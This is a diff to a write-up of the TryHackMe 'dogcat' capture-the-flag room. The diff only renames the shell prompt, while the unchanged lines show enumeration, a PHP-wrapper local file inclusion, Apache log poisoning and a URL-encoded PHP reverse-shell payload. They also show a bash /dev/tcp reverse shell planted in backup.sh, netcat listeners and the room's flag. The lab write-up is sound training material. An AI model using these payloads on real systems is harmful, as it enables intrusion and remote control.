@@ -6,7 +6,7 @@
 # enumeration
 ## nmap
 ```console
-kali@kali:~$ sudo python3 pymap.py -t <target>
+bibo318@parrot:~$ sudo python3 pymap.py -t <target>
 [sudo] password for kali:                                                                          
 created by gu2rks/kurohat                                                                          
 find me here https://github.com/gu2rks                                                             
@@ -45,7 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
 
 ## Port 80 Web directory discovering
 ```
-kali@kali:~/THM/dogcat$ gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
+bibo318@parrot:~/THM/dogcat$ gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
 ===============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
@@ -100,7 +100,7 @@ a litle bird told me to I can use **PHP wrapper**. After some digging, I found [
 
 now let try to get cat.php: ```/?view=php://filter/convert.base64-encode/resource=cat```
 ```console
-kali@kali:~/THM/dogcat$ echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
+bibo318@parrot:~/THM/dogcat$ echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
 <img src="cats/<?php echo rand(1, 10); ?>.jpg" />
 ```
 
@@ -146,7 +146,7 @@ use chef to decode it or ``base64``
 ```
 so its works now let get flag which we already know where its located ```/?view=php://filter/convert.base64-encode/resource=cat/../flag.php```
 ```console
-kali@kali:~/THM/dogcat$ echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
+bibo318@parrot:~/THM/dogcat$ echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
 <?php
 $flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
 ?>
@@ -189,7 +189,7 @@ to make sure that url encoding will not fuck up our shell payload use [urlencode
 
 now let let shell ```/?view=php://filter/resource=cat../../../../../../../var/log/apache2/access.log&ext&c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.14.151%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27```
 ```console
-kali@kali:~$ nc -nvlp 1234
+bibo318@parrot:~$ nc -nvlp 1234
 listening on [any] 1234 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.13.48] 51288
 /bin/sh: 0: can't access tty; job control turned off
@@ -279,7 +279,7 @@ we knew that `backup.sh` create a `backup.tar`. moreover this show that `backup.
 we can esacalate the container by modifying `backup.sh` adding reverse shell `bash -i >& /dev/tcp/<ip>/6969 0>&1`. Now run nc and waiting for shell
 
 ```console
-kali@kali:~/THM/dogcat$ nc -nlvp 6969
+bibo318@parrot:~/THM/dogcat$ nc -nlvp 6969
 listening on [any] 6969 ...
 connect to [10.8.14.151] from (UNKNOWN) [10.10.13.48] 57520
 bash: cannot set terminal process group (7082): Inappropriate ioctl for device
